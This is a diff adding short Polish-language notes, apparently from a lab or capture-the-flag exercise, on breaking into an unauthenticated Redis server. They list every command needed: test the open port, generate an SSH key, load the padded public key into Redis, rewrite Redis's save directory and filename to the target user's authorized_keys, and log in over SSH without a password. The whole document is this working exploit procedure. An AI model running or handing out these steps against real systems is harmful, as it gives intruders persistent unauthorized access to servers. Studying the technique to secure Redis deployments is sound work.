@@ -1,1 +1,35 @@
 
+Port: 6379
+
+
+
+
+→ telnet <ip_maszynki> 6379
+set arek hacker
+get arek
+set arek hacker
+get arek
+
+ 
+→ apt-get update
+→ apt install redis-tools -y
+→ redis-cli -h <ip_maszynki>
+>ping (odpowiedz powinna byc PONG)
+>exit
+→ ssh-keygen (I nic nie podajemy same [enter])
+→ cd /root/.ssh. (tu znajduje sie stworzony klucz)
+→ (echo -e “\n\n”; cat ~/.ssh/id_rsa.pub; echo -e “\n\n”) > hacker.txt
+     (dodaje po dwie linie jest to potrzbne)
+→ cat hacker.txt | redis-cli -h <ip_maszynki> -x set hacker
+     (-x od execute)
+→ redis-cli -h <ip_maszynki>
+>get hacker
+>config set dir /home/<user>/.ssh
+>config get dir
+>config set dbfilename “authorized_keys”  
+(plik przechowuje klucze publiczne uzytkownikow ktozy sa autoryzowani do dostepu do servera bez hasla)
+>save
+>exit
+
+ 
+→ ssh -i id_rsa <user>@<ip> (powinno nas zalogowac do maszynki)
